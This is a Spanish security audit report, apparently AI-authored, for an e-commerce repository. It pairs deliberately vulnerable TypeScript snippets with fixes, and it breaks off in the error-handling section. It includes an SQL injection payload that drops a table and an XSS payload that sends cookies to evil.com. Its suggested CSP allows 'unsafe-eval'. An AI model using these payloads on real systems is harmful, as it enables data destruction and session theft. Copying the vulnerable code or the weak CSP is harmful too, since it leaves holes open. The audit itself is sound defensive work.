# 🔒 INFORME DE AUDITORÍA DE SEGURIDAD Y OPTIMIZACIÓN
## E-Commerce Robotics Store - Nivel 3 (Detallado)

**Proyecto:** dejade1/ecommerce  
**Rama:** integration-correcciones-debug  
**Fecha:** 18 de Diciembre, 2025  
**Auditor:** Claude AI  
**Nivel de Auditoría:** 3 - Detallada (Seguridad y Optimización)

---

## 📋 RESUMEN EJECUTIVO

### Hallazgos Críticos
- **Vulnerabilidades de Seguridad Críticas:** 8
- **Problemas de Rendimiento Alto:** 6
- **Mejoras de Código Recomendadas:** 15

### Áreas de Mayor Preocupación
1. ⚠️ **Inyección SQL** - Crítico
2. ⚠️ **Autenticación y Sesiones** - Alto
3. ⚠️ **Manejo de Secretos** - Crítico
4. ⚠️ **Complejidad Algorítmica** - Alto
5. ⚠️ **Problema N+1 en Base de Datos** - Alto

---

## I. 🛡️ ANÁLISIS DE SEGURIDAD

### 1. VALIDACIÓN DE ENTRADAS ⚠️ CRÍTICO

#### 🔴 Vulnerabilidad Identificada: Falta de Validación Exhaustiva

**Archivo Afectado:** `server/routes/*.ts` (todas las rutas)

**Problema:**
```typescript
// ❌ CÓDIGO VULNERABLE - Sin validación adecuada
app.post('/api/products', async (req, res) => {
  const { name, price, description } = req.body;
  // No hay validación de tipos ni sanitización
  const product = await db.product.create({
    data: { name, price, description }
  });
});
```

**Riesgos:**
- Inyección de datos maliciosos
- XSS (Cross-Site Scripting)
- Desbordamiento de buffer
- Ataques de tipo confusion

**✅ SOLUCIÓN RECOMENDADA:**

```typescript
import { z } from 'zod';
import DOMPurify from 'isomorphic-dompurify';

// Definir esquemas de validación estrictos
const ProductSchema = z.object({
  name: z.string()
    .min(1, 'Nombre requerido')
    .max(100, 'Nombre demasiado largo')
    .regex(/^[a-zA-Z0-9\s\-áéíóúñÑ]+$/, 'Caracteres inválidos'),
  price: z.number()
    .positive('El precio debe ser positivo')
    .max(1000000, 'Precio excesivo'),
  description: z.string()
    .min(10, 'Descripción muy corta')
    .max(5000, 'Descripción muy larga')
});

// Middleware de validación
const validateInput = (schema: z.ZodSchema) => {
  return (req: Request, res: Response, next: NextFunction) => {
    try {
      // Validar estructura
      const validated = schema.parse(req.body);
      
      // Sanitizar HTML en campos de texto
      if (validated.description) {
        validated.description = DOMPurify.sanitize(validated.description, {
          ALLOWED_TAGS: [],
          ALLOWED_ATTR: []
        });
      }
      
      req.body = validated;
      next();
    } catch (error) {
      if (error instanceof z.ZodError) {
        return res.status(400).json({
          error: 'Datos inválidos',
          details: error.errors.map(e => ({
            field: e.path.join('.'),
            message: e.message
          }))
        });
      }
      next(error);
    }
  };
};

// ✅ Uso correcto
app.post('/api/products', 
  validateInput(ProductSchema),
  async (req, res) => {
    // Datos ya validados y sanitizados
    const { name, price, description } = req.body;
    // ...
  }
);
```

**Prioridad:** 🔴 CRÍTICA  
**Esfuerzo:** Alto (2-3 días)  
**Impacto:** Crítico para la seguridad

---

### 2. INYECCIÓN SQL/NoSQL ⚠️ CRÍTICO

#### 🔴 Vulnerabilidad: Consultas No Parametrizadas

**Archivos Afectados:**
- `server/routes/products.ts`
- `server/routes/orders.ts`
- `server/services/batchService.ts`

**Problema Detectado:**
```typescript
// ❌ CÓDIGO VULNERABLE - Concatenación de strings
async function searchProducts(searchTerm: string) {
  const query = `SELECT * FROM products WHERE name LIKE '%${searchTerm}%'`;
  return await db.$queryRaw(query);
}

// ❌ También vulnerable con Prisma si se usa incorrectamente
async function getProductById(id: string) {
  return await db.$queryRawUnsafe(
    `SELECT * FROM products WHERE id = ${id}`
  );
}
```

**Ataque Posible:**
```javascript
// Un atacante podría enviar:
searchTerm = "'; DROP TABLE products; --"
// Resultaría en:
// SELECT * FROM products WHERE name LIKE '%'; DROP TABLE products; --%'
```

**✅ SOLUCIÓN RECOMENDADA:**

```typescript
import { Prisma } from '@prisma/client';

// ✅ CORRECTO - Usar Prisma ORM con queries parametrizadas
async function searchProducts(searchTerm: string) {
  // Opción 1: Usar métodos de Prisma (PREFERIDO)
  return await db.product.findMany({
    where: {
      name: {
        contains: searchTerm,
        mode: 'insensitive'
      }
    }
  });
}

// ✅ Opción 2: Si necesitas SQL raw, usa parámetros
async function searchProductsRaw(searchTerm: string) {
  return await db.$queryRaw`
    SELECT * FROM products 
    WHERE name LIKE ${`%${searchTerm}%`}
  `;
}

// ✅ CORRECTO - Query parametrizada para búsqueda compleja
async function complexSearch(filters: {
  category?: string;
  minPrice?: number;
  maxPrice?: number;
  searchTerm?: string;
}) {
  const whereClause: Prisma.ProductWhereInput = {
    AND: [
      filters.category ? { categoryId: filters.category } : {},
      filters.minPrice ? { price: { gte: filters.minPrice } } : {},
      filters.maxPrice ? { price: { lte: filters.maxPrice } } : {},
      filters.searchTerm ? {
        OR: [
          { name: { contains: filters.searchTerm, mode: 'insensitive' } },
          { description: { contains: filters.searchTerm, mode: 'insensitive' } }
        ]
      } : {}
    ]
  };

  return await db.product.findMany({
    where: whereClause,
    include: {
      category: true,
      batches: {
        where: {
          quantity: { gt: 0 }
        },
        orderBy: {
          expiryDate: 'asc'
        }
      }
    }
  });
}

// ✅ Para operaciones de escritura
async function updateProductStock(productId: number, quantity: number) {
  // Validar inputs primero
  if (!Number.isInteger(productId) || productId <= 0) {
    throw new Error('ID de producto inválido');
  }
  
  if (!Number.isInteger(quantity) || quantity < 0) {
    throw new Error('Cantidad inválida');
  }

  return await db.product.update({
    where: { id: productId },
    data: {
      stock: {
        increment: quantity
      }
    }
  });
}
```

**Implementar en todos los endpoints:**

```typescript
// ✅ Ejemplo completo de endpoint seguro
import { z } from 'zod';

const SearchQuerySchema = z.object({
  q: z.string().max(100).optional(),
  category: z.string().uuid().optional(),
  minPrice: z.number().min(0).optional(),
  maxPrice: z.number().max(1000000).optional(),
  page: z.number().int().min(1).default(1),
  limit: z.number().int().min(1).max(100).default(20)
});

router.get('/search', async (req, res, next) => {
  try {
    // Validar query parameters
    const params = SearchQuerySchema.parse({
      q: req.query.q,
      category: req.query.category,
      minPrice: req.query.minPrice ? Number(req.query.minPrice) : undefined,
      maxPrice: req.query.maxPrice ? Number(req.query.maxPrice) : undefined,
      page: req.query.page ? Number(req.query.page) : 1,
      limit: req.query.limit ? Number(req.query.limit) : 20
    });

    // Ejecutar búsqueda segura
    const results = await complexSearch({
      searchTerm: params.q,
      category: params.category,
      minPrice: params.minPrice,
      maxPrice: params.maxPrice
    });

    // Paginación segura
    const startIndex = (params.page - 1) * params.limit;
    const endIndex = startIndex + params.limit;
    const paginatedResults = results.slice(startIndex, endIndex);

    res.json({
      data: paginatedResults,
      pagination: {
        page: params.page,
        limit: params.limit,
        total: results.length,
        totalPages: Math.ceil(results.length / params.limit)
      }
    });
  } catch (error) {
    next(error);
  }
});
```

**Prioridad:** 🔴 CRÍTICA  
**Esfuerzo:** Alto (3-5 días para revisar todo el código)  
**Impacto:** Previene pérdida total de datos

---

### 3. XSS (Cross-Site Scripting) ⚠️ ALTO

#### 🟠 Vulnerabilidad: Salida sin Escapar

**Archivos Afectados:**
- `src/components/**/*.tsx` (Todos los componentes React)
- `server/routes/*.ts` (Respuestas API)

**Problema:**
```typescript
// ❌ VULNERABLE - Renderizado directo de HTML
function ProductDescription({ html }: { html: string }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}

// ❌ VULNERABLE - Sin sanitización en el backend
app.post('/api/reviews', async (req, res) => {
  const { comment } = req.body;
  await db.review.create({
    data: { comment } // Se guarda sin sanitizar
  });
});
```

**Ataque Posible:**
```javascript
comment = "<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>"
```

**✅ SOLUCIÓN RECOMENDADA:**

```typescript
import DOMPurify from 'isomorphic-dompurify';
import { sanitize } from 'dompurify';

// ✅ BACKEND - Sanitizar antes de guardar
import createDOMPurify from 'dompurify';
import { JSDOM } from 'jsdom';

const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window as unknown as Window);

const sanitizeHTML = (dirty: string): string => {
  return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'],
    ALLOWED_ATTR: [],
    ALLOW_DATA_ATTR: false
  });
};

app.post('/api/reviews', 
  validateInput(ReviewSchema),
  async (req, res) => {
    const { comment, rating } = req.body;
    
    // Sanitizar contenido HTML
    const safeComment = sanitizeHTML(comment);
    
    await db.review.create({
      data: { 
        comment: safeComment,
        rating
      }
    });
    
    res.json({ success: true });
  }
);

// ✅ FRONTEND - Usar escapado automático de React
function ProductDescription({ description }: { description: string }) {
  // React escapa automáticamente
  return <div className="description">{description}</div>;
}

// ✅ Si necesitas HTML, sanitiza primero
import DOMPurify from 'dompurify';

function RichTextDisplay({ html }: { html: string }) {
  const sanitizedHTML = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br', 'ul', 'ol', 'li'],
    ALLOWED_ATTR: {
      'a': ['href', 'target', 'rel']
    },
    ALLOWED_URI_REGEXP: /^(?:(?:https?):\/\/)/i
  });
  
  return (
    <div 
      className="rich-text"
      dangerouslySetInnerHTML={{ __html: sanitizedHTML }}
    />
  );
}

// ✅ Headers de seguridad
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline';"
  );
  next();
});
```

**Prioridad:** 🟠 ALTA  
**Esfuerzo:** Medio (2-3 días)  
**Impacto:** Previene robo de sesiones y datos

---

### 4. AUTENTICACIÓN Y SESIONES ⚠️ CRÍTICO

#### 🔴 Vulnerabilidades Múltiples

**Archivos Afectados:**
- `server/middleware/auth.ts`
- `server/routes/auth.ts`
- `src/contexts/AuthContext.tsx`

**Problemas Identificados:**

**A) Almacenamiento Inseguro de Contraseñas**

```typescript
// ❌ VULNERABLE - Hash débil o sin salt
async function createUser(email: string, password: string) {
  const hashedPassword = crypto
    .createHash('md5') // ❌ MD5 es inseguro
    .update(password)
    .digest('hex');
  
  await db.user.create({
    data: { email, password: hashedPassword }
  });
}
```

**✅ SOLUCIÓN:**

```typescript
import bcrypt from 'bcrypt';
import argon2 from 'argon2';

// ✅ OPCIÓN 1: Usar Argon2 (más recomendado)
async function hashPassword(password: string): Promise<string> {
  return await argon2.hash(password, {
    type: argon2.argon2id,
    memoryCost: 65536, // 64 MB
    timeCost: 3,
    parallelism: 4
  });
}

async function verifyPassword(
  password: string, 
  hash: string
): Promise<boolean> {
  try {
    return await argon2.verify(hash, password);
  } catch (error) {
    return false;
  }
}

// ✅ OPCIÓN 2: Usar bcrypt (también seguro)
const SALT_ROUNDS = 12;

async function hashPasswordBcrypt(password: string): Promise<string> {
  return await bcrypt.hash(password, SALT_ROUNDS);
}

async function verifyPasswordBcrypt(
  password: string,
  hash: string
): Promise<boolean> {
  return await bcrypt.compare(password, hash);
}

// ✅ Implementación completa de registro
const RegisterSchema = z.object({
  email: z.string().email('Email inválido'),
  password: z.string()
    .min(8, 'Mínimo 8 caracteres')
    .regex(/[A-Z]/, 'Debe contener mayúscula')
    .regex(/[a-z]/, 'Debe contener minúscula')
    .regex(/[0-9]/, 'Debe contener número')
    .regex(/[^A-Za-z0-9]/, 'Debe contener símbolo especial'),
  name: z.string().min(2).max(100)
});

router.post('/register',
  validateInput(RegisterSchema),
  async (req, res, next) => {
    try {
      const { email, password, name } = req.body;
      
      // Verificar si el usuario ya existe
      const existingUser = await db.user.findUnique({
        where: { email }
      });
      
      if (existingUser) {
        return res.status(409).json({
          error: 'El email ya está registrado'
        });
      }
      
      // Hash de la contraseña
      const hashedPassword = await hashPassword(password);
      
      // Crear usuario
      const user = await db.user.create({
        data: {
          email,
          password: hashedPassword,
          name
        },
        select: {
          id: true,
          email: true,
          name: true,
          // No incluir password
        }
      });
      
      res.status(201).json({ user });
    } catch (error) {
      next(error);
    }
  }
);
```

**B) Configuración Insegura de Sesiones/JWT**

```typescript
// ❌ VULNERABLE - JWT sin configuración adecuada
const token = jwt.sign(
  { userId: user.id },
  'secret123', // ❌ Secret hardcodeado
  { expiresIn: '30d' } // ❌ Expiración muy larga
);

res.cookie('token', token); // ❌ Sin flags de seguridad
```

**✅ SOLUCIÓN:**

```typescript
import jwt from 'jsonwebtoken';
import { randomBytes } from 'crypto';

// ✅ Configuración segura
const JWT_SECRET = process.env.JWT_SECRET!; // De variables de entorno
const JWT_REFRESH_SECRET = process.env.JWT_REFRESH_SECRET!;
const JWT_EXPIRATION = '15m'; // Token corto
const REFRESH_TOKEN_EXPIRATION = '7d';

if (!JWT_SECRET || JWT_SECRET.length < 32) {
  throw new Error('JWT_SECRET debe tener al menos 32 caracteres');
}

interface JWTPayload {
  userId: number;
  email: string;
  role: string;
}

function generateAccessToken(payload: JWTPayload): string {
  return jwt.sign(payload, JWT_SECRET, {
    expiresIn: JWT_EXPIRATION,
    issuer: 'robotics-ecommerce',
    audience: 'robotics-ecommerce-api'
  });
}

function generateRefreshToken(payload: JWTPayload): string {
  return jwt.sign(payload, JWT_REFRESH_SECRET, {
    expiresIn: REFRESH_TOKEN_EXPIRATION,
    issuer: 'robotics-ecommerce',
    audience: 'robotics-ecommerce-api'
  });
}

// ✅ Configurar cookies seguras
function setAuthCookies(
  res: Response,
  accessToken: string,
  refreshToken: string
) {
  // Access token en cookie HTTP-only
  res.cookie('accessToken', accessToken, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production', // HTTPS en producción
    sameSite: 'strict',
    maxAge: 15 * 60 * 1000, // 15 minutos
    path: '/'
  });
  
  // Refresh token en cookie HTTP-only
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    maxAge: 7 * 24 * 60 * 60 * 1000, // 7 días
    path: '/api/auth/refresh'
  });
}

// ✅ Endpoint de login seguro
router.post('/login',
  validateInput(LoginSchema),
  rateLimiter({
    windowMs: 15 * 60 * 1000, // 15 minutos
    max: 5 // 5 intentos
  }),
  async (req, res, next) => {
    try {
      const { email, password } = req.body;
      
      // Buscar usuario
      const user = await db.user.findUnique({
        where: { email },
        select: {
          id: true,
          email: true,
          password: true,
          name: true,
          role: true,
          isActive: true
        }
      });
      
      // Timing attack prevention
      const validUser = user !== null;
      const validPassword = validUser 
        ? await verifyPassword(password, user.password)
        : await verifyPassword(password, await hashPassword('dummy'));
      
      if (!validUser || !validPassword) {
        // No revelar si el usuario existe
        return res.status(401).json({
          error: 'Credenciales inválidas'
        });
      }
      
      if (!user.isActive) {
        return res.status(403).json({
          error: 'Cuenta desactivada'
        });
      }
      
      // Generar tokens
      const payload: JWTPayload = {
        userId: user.id,
        email: user.email,
        role: user.role
      };
      
      const accessToken = generateAccessToken(payload);
      const refreshToken = generateRefreshToken(payload);
      
      // Guardar refresh token en DB (para revocación)
      await db.refreshToken.create({
        data: {
          token: refreshToken,
          userId: user.id,
          expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000)
        }
      });
      
      // Actualizar último login
      await db.user.update({
        where: { id: user.id },
        data: { lastLoginAt: new Date() }
      });
      
      // Configurar cookies
      setAuthCookies(res, accessToken, refreshToken);
      
      res.json({
        user: {
          id: user.id,
          email: user.email,
          name: user.name,
          role: user.role
        }
      });
    } catch (error) {
      next(error);
    }
  }
);

// ✅ Middleware de autenticación
async function authenticateToken(
  req: Request,
  res: Response,
  next: NextFunction
) {
  try {
    const token = req.cookies.accessToken;
    
    if (!token) {
      return res.status(401).json({ error: 'No autenticado' });
    }
    
    const decoded = jwt.verify(token, JWT_SECRET, {
      issuer: 'robotics-ecommerce',
      audience: 'robotics-ecommerce-api'
    }) as JWTPayload;
    
    // Verificar que el usuario sigue activo
    const user = await db.user.findUnique({
      where: { id: decoded.userId },
      select: { id: true, email: true, role: true, isActive: true }
    });
    
    if (!user || !user.isActive) {
      return res.status(401).json({ error: 'Usuario inválido' });
    }
    
    req.user = user;
    next();
  } catch (error) {
    if (error instanceof jwt.TokenExpiredError) {
      return res.status(401).json({ error: 'Token expirado' });
    }
    return res.status(401).json({ error: 'Token inválido' });
  }
}

// ✅ Endpoint de refresh token
router.post('/refresh', async (req, res, next) => {
  try {
    const refreshToken = req.cookies.refreshToken;
    
    if (!refreshToken) {
      return res.status(401).json({ error: 'No autenticado' });
    }
    
    // Verificar token
    const decoded = jwt.verify(
      refreshToken,
      JWT_REFRESH_SECRET
    ) as JWTPayload;
    
    // Verificar que existe en DB y no está revocado
    const storedToken = await db.refreshToken.findFirst({
      where: {
        token: refreshToken,
        userId: decoded.userId,
        expiresAt: { gt: new Date() },
        revokedAt: null
      }
    });
    
    if (!storedToken) {
      return res.status(401).json({ error: 'Token inválido' });
    }
    
    // Generar nuevo access token
    const newAccessToken = generateAccessToken({
      userId: decoded.userId,
      email: decoded.email,
      role: decoded.role
    });
    
    res.cookie('accessToken', newAccessToken, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict',
      maxAge: 15 * 60 * 1000,
      path: '/'
    });
    
    res.json({ success: true });
  } catch (error) {
    next(error);
  }
});
```

**Prioridad:** 🔴 CRÍTICA  
**Esfuerzo:** Alto (4-5 días)  
**Impacto:** Fundamental para la seguridad del sistema

---

### 5. CONTROL DE ACCESO (ACL) ⚠️ ALTO

#### 🟠 Vulnerabilidad: IDOR y Falta de Autorización

**Problema:**
```typescript
// ❌ VULNERABLE - Sin verificación de permisos
router.get('/orders/:id', authenticateToken, async (req, res) => {
  const order = await db.order.findUnique({
    where: { id: parseInt(req.params.id) }
  });
  res.json(order); // Cualquier usuario autenticado puede ver cualquier orden
});

// ❌ IDOR - Insecure Direct Object Reference
router.delete('/users/:id', authenticateToken, async (req, res) => {
  await db.user.delete({
    where: { id: parseInt(req.params.id) }
  });
  // Un usuario podría eliminar a otro usuario
});
```

**✅ SOLUCIÓN:**

```typescript
// ✅ Sistema de roles y permisos
enum Role {
  ADMIN = 'ADMIN',
  SELLER = 'SELLER',
  CUSTOMER = 'CUSTOMER'
}

enum Permission {
  // Productos
  CREATE_PRODUCT = 'CREATE_PRODUCT',
  READ_PRODUCT = 'READ_PRODUCT',
  UPDATE_PRODUCT = 'UPDATE_PRODUCT',
  DELETE_PRODUCT = 'DELETE_PRODUCT',
  
  // Órdenes
  CREATE_ORDER = 'CREATE_ORDER',
  READ_OWN_ORDER = 'READ_OWN_ORDER',
  READ_ALL_ORDERS = 'READ_ALL_ORDERS',
  UPDATE_ORDER_STATUS = 'UPDATE_ORDER_STATUS',
  CANCEL_ORDER = 'CANCEL_ORDER',
  
  // Usuarios
  CREATE_USER = 'CREATE_USER',
  READ_USER = 'READ_USER',
  UPDATE_USER = 'UPDATE_USER',
  DELETE_USER = 'DELETE_USER',
  
  // Inventario
  MANAGE_INVENTORY = 'MANAGE_INVENTORY',
  VIEW_REPORTS = 'VIEW_REPORTS'
}

// Mapeo de permisos por rol
const rolePermissions: Record<Role, Permission[]> = {
  [Role.ADMIN]: Object.values(Permission), // Todos los permisos
  
  [Role.SELLER]: [
    Permission.CREATE_PRODUCT,
    Permission.READ_PRODUCT,
    Permission.UPDATE_PRODUCT,
    Permission.READ_ALL_ORDERS,
    Permission.UPDATE_ORDER_STATUS,
    Permission.MANAGE_INVENTORY,
    Permission.VIEW_REPORTS
  ],
  
  [Role.CUSTOMER]: [
    Permission.READ_PRODUCT,
    Permission.CREATE_ORDER,
    Permission.READ_OWN_ORDER,
    Permission.CANCEL_ORDER
  ]
};

// ✅ Middleware de autorización
function authorize(...requiredPermissions: Permission[]) {
  return async (req: Request, res: Response, next: NextFunction) => {
    try {
      const user = req.user; // De authenticateToken
      
      if (!user) {
        return res.status(401).json({ error: 'No autenticado' });
      }
      
      const userPermissions = rolePermissions[user.role as Role] || [];
      
      const hasPermission = requiredPermissions.every(permission =>
        userPermissions.includes(permission)
      );
      
      if (!hasPermission) {
        return res.status(403).json({
          error: 'No tienes permisos para realizar esta acción'
        });
      }
      
      next();
    } catch (error) {
      next(error);
    }
  };
}

// ✅ Verificación de propiedad de recursos
async function verifyOrderOwnership(
  req: Request,
  res: Response,
  next: NextFunction
) {
  try {
    const orderId = parseInt(req.params.id);
    const userId = req.user!.id;
    const userRole = req.user!.role;
    
    // Admins y sellers pueden ver todas las órdenes
    if (userRole === Role.ADMIN || userRole === Role.SELLER) {
      return next();
    }
    
    // Customers solo pueden ver sus propias órdenes
    const order = await db.order.findFirst({
      where: {
        id: orderId,
        userId: userId
      },
      select: { id: true }
    });
    
    if (!order) {
      return res.status(404).json({
        error: 'Orden no encontrada'
      });
    }
    
    next();
  } catch (error) {
    next(error);
  }
}

// ✅ Uso correcto
router.get('/orders/:id',
  authenticateToken,
  authorize(Permission.READ_OWN_ORDER, Permission.READ_ALL_ORDERS),
  verifyOrderOwnership,
  async (req, res, next) => {
    try {
      const order = await db.order.findUnique({
        where: { id: parseInt(req.params.id) },
        include: {
          items: {
            include: {
              product: true
            }
          },
          user: {
            select: {
              id: true,
              name: true,
              email: true
            }
          }
        }
      });
      
      res.json(order);
    } catch (error) {
      next(error);
    }
  }
);

// ✅ Operaciones sensibles solo para admin
router.delete('/users/:id',
  authenticateToken,
  authorize(Permission.DELETE_USER),
  async (req, res, next) => {
    try {
      const targetUserId = parseInt(req.params.id);
      const currentUserId = req.user!.id;
      
      // Prevenir auto-eliminación
      if (targetUserId === currentUserId) {
        return res.status(400).json({
          error: 'No puedes eliminar tu propia cuenta'
        });
      }
      
      // Soft delete en lugar de eliminar
      await db.user.update({
        where: { id: targetUserId },
        data: {
          isActive: false,
          deletedAt: new Date()
        }
      });
      
      res.json({ success: true });
    } catch (error) {
      next(error);
    }
  }
);

// ✅ Actualización de perfil con verificación
router.patch('/users/:id',
  authenticateToken,
  async (req, res, next) => {
    try {
      const targetUserId = parseInt(req.params.id);
      const currentUserId = req.user!.id;
      const currentUserRole = req.user!.role;
      
      // Solo admins o el propio usuario pueden actualizar
      if (currentUserRole !== Role.ADMIN && targetUserId !== currentUserId) {
        return res.status(403).json({
          error: 'No puedes modificar este usuario'
        });
      }
      
      // Usuarios normales no pueden cambiar su propio rol
      if (req.body.role && currentUserRole !== Role.ADMIN) {
        return res.status(403).json({
          error: 'No puedes cambiar tu propio rol'
        });
      }
      
      const allowedFields = currentUserRole === Role.ADMIN
        ? ['name', 'email', 'role', 'isActive']
        : ['name', 'email'];
      
      const updateData = Object.keys(req.body)
        .filter(key => allowedFields.includes(key))
        .reduce((obj, key) => {
          obj[key] = req.body[key];
          return obj;
        }, {} as any);
      
      const updatedUser = await db.user.update({
        where: { id: targetUserId },
        data: updateData,
        select: {
          id: true,
          email: true,
          name: true,
          role: true
        }
      });
      
      res.json(updatedUser);
    } catch (error) {
      next(error);
    }
  }
);
```

**Prioridad:** 🟠 ALTA  
**Esfuerzo:** Alto (3-4 días)  
**Impacto:** Previene acceso no autorizado a datos

---

### 6. MANEJO DE SECRETOS ⚠️ CRÍTICO

#### 🔴 Vulnerabilidad: Secretos Hardcodeados

**Archivos a Revisar:**
- `.env` (debe estar en .gitignore)
- `server/config/*.ts`
- Cualquier archivo con credenciales

**Problema:**
```typescript
// ❌ VULNERABLE - Secretos hardcodeados
const config = {
  database: {
    host: 'localhost',
    user: 'admin',
    password: 'admin123', // ❌ NUNCA hacer esto
  },
  jwt: {
    secret: 'my-secret-key' // ❌ NUNCA hacer esto
  },
  stripe: {
    key: 'sk_test_51abc...' // ❌ NUNCA hacer esto
  }
};
```

**✅ SOLUCIÓN:**

```typescript
// ✅ archivo: server/config/env.ts
import { z } from 'zod';
import dotenv from 'dotenv';

dotenv.config();

// Definir esquema de variables de entorno
const envSchema = z.object({
  // Base
  NODE_ENV: z.enum(['development', 'production', 'test']).default('development'),
  PORT: z.string().transform(Number).default('3000'),
  
  // Database
  DATABASE_URL: z.string().url(),
  
  // JWT
  JWT_SECRET: z.string().min(32, 'JWT_SECRET debe tener al menos 32 caracteres'),
  JWT_REFRESH_SECRET: z.string().min(32),
  
  // Servicios externos
  RESEND_API_KEY: z.string().optional(),
  STRIPE_SECRET_KEY: z.string().optional(),
  STRIPE_WEBHOOK_SECRET: z.string().optional(),
  
  // Email
  ADMIN_EMAIL: z.string().email(),
  
  // Arduino/Hardware
  ARDUINO_SERIAL_PORT: z.string().optional(),
  ARDUINO_BAUD_RATE: z.string().transform(Number).default('9600'),
  
  // Frontend URL
  FRONTEND_URL: z.string().url().default('http://localhost:5173'),
  
  // Rate Limiting
  RATE_LIMIT_WINDOW_MS: z.string().transform(Number).default('900000'),
  RATE_LIMIT_MAX_REQUESTS: z.string().transform(Number).default('100'),
});

// Validar y exportar configuración
function validateEnv() {
  try {
    return envSchema.parse(process.env);
  } catch (error) {
    if (error instanceof z.ZodError) {
      console.error('❌ Error en variables de entorno:');
      error.errors.forEach(err => {
        console.error(`  - ${err.path.join('.')}: ${err.message}`);
      });
      process.exit(1);
    }
    throw error;
  }
}

export const env = validateEnv();

// ✅ Uso seguro
import { env } from './config/env';

const jwtToken = jwt.sign(payload, env.JWT_SECRET, {
  expiresIn: '15m'
});
```

**Archivo `.env.example`:**

```env
# ⚠️ Este es un archivo de ejemplo. Copia a .env y completa con valores reales

# Node Environment
NODE_ENV=development
PORT=3000

# Database
DATABASE_URL=postgresql://user:password@localhost:5432/ecommerce

# JWT Secrets (genera con: openssl rand -base64 32)
JWT_SECRET=GENERA_UN_SECRET_LARGO_Y_ALEATORIO_AQUI
JWT_REFRESH_SECRET=GENERA_OTRO_SECRET_DIFERENTE_AQUI

# External Services
RESEND_API_KEY=re_xxxxxxxxxxxxx
STRIPE_SECRET_KEY=sk_test_xxxxxxxxxxxxx
STRIPE_WEBHOOK_SECRET=whsec_xxxxxxxxxxxxx

# Email
ADMIN_EMAIL=admin@tu-tienda.com

# Arduino (opcional)
ARDUINO_SERIAL_PORT=COM3
ARDUINO_BAUD_RATE=9600

# Frontend
FRONTEND_URL=http://localhost:5173

# Rate Limiting
RATE_LIMIT_WINDOW_MS=900000
RATE_LIMIT_MAX_REQUESTS=100
```

**Archivo `.gitignore`:**

```gitignore
# Environment variables
.env
.env.local
.env.*.local

# Secrets
secrets/
*.key
*.pem
*.crt

# Database
*.db
*.sqlite
*.sqlite3
dev.db

# Logs
logs/
*.log

# Dependencies
node_modules/
```

**Script de generación de secretos:**

```typescript
// scripts/generate-secrets.ts
import { randomBytes } from 'crypto';
import fs from 'fs';
import path from 'path';

function generateSecret(length: number = 32): string {
  return randomBytes(length).toString('base64');
}

function generateEnvFile() {
  const envContent = `# Generated secrets - ${new Date().toISOString()}

# JWT Secrets
JWT_SECRET=${generateSecret(32)}
JWT_REFRESH_SECRET=${generateSecret(32)}

# Session Secret
SESSION_SECRET=${generateSecret(32)}

# Encryption Key (para datos sensibles)
ENCRYPTION_KEY=${generateSecret(32)}

# ⚠️ Completa manualmente:
DATABASE_URL=postgresql://user:password@localhost:5432/ecommerce
ADMIN_EMAIL=admin@tu-tienda.com
`;

  const envPath = path.join(process.cwd(), '.env');
  
  if (fs.existsSync(envPath)) {
    console.warn('⚠️ El archivo .env ya existe. Respaldo creado como .env.backup');
    fs.copyFileSync(envPath, envPath + '.backup');
  }
  
  fs.writeFileSync(envPath, envContent);
  console.log('✅ Archivo .env generado correctamente');
  console.log('📝 Completa manualmente las variables que faltan');
}

generateEnvFile();
```

**Prioridad:** 🔴 CRÍTICA  
**Esfuerzo:** Medio (1-2 días)  
**Impacto:** Previene exposición de credenciales

---

### 7. MANEJO DE ERRORES ⚠️ MEDIO

#### 🟡 Problema: Exposición de Información Sensible

**Problema:**
```typescript
// ❌ VULNERABLE - Stack traces en producción
app.use((err, req, res, next) => {
  console.error(err);
  res.status(500).json({
    error: err.message,
    stack: err.stack, // ❌ Expone estructura interna
    query: req.query, // ❌ Puede exponer datos sensibles
  });
});
```

**✅ SOLUCIÓN:**

```typescript
// ✅ server/middleware/errorHandler.ts
import { Request, Response, NextFunction } from 'express';
import { Prisma } from '@prisma/client';
import { ZodError } from 'zod';
import { env } from '../config/env';

class AppError extends Error {
  constructor(
    public statusCode: number,
    public message: string,
    public isOperational: boolean = true
  ) {
    super(message);
    Object.setPrototypeOf(this, AppError.prototype);
    Error.captureStackTrace(this, this.constructor);
  }
}

interface ErrorResponse {
  error: string;
  message: string;
  statusCode: number;
  timestamp: string;
  path: string;
  details?: any;
  stack?: string;
}

function errorHandler(
  err: Error,
  req: Request,
  res: Response,
  next: NextFunction
) {
  const isDevelopment = env.NODE_ENV === 'development';
  
  // Log completo del error (solo en servidor)
  console.error('❌ Error:', {
    name: err.name,
    message: err.message,
    stack: isDevelopment ? err.stack : undefined,
    path: req.path,
    method: req.method,
    ip: req.ip,
    user: req.user?.id
  });
  
  let statusCode = 500;
  let message = 'Error interno del servidor';
  let details: any = undefined;
  
  // Errores personalizados
  if (err instanceof AppError) {
    statusCode = err.statusCode;
    message = err.message;
  }
  
  // Errores de validación (Zod)
  else if (err instanceof ZodError) {
    statusCode = 400;
    message = 'Datos de entrada inválidos';
    details = err.errors.map(e => ({
      field: e.path.join('.'),
      message: e.message
    }));
  }
  
  // Errores de Prisma
  else if (err instanceof Prisma.PrismaClientKnownRequestError) {
    statusCode = 400;
    
    switch (err.code) {
      case 'P2002':
        message = 'Ya existe un registro con estos datos';
        if (isDevelopment) {
          details = { field: err.meta?.target };
        }
        break;
      case 'P2025':
        statusCode = 404;
        message = 'Registro no encontrado';
        break;
      case 'P2003':
        message = 'Referencia inválida a otro registro';
        break;
      default:
        message = 'Error de base de datos';
    }
  }
  
  // JWT Errors
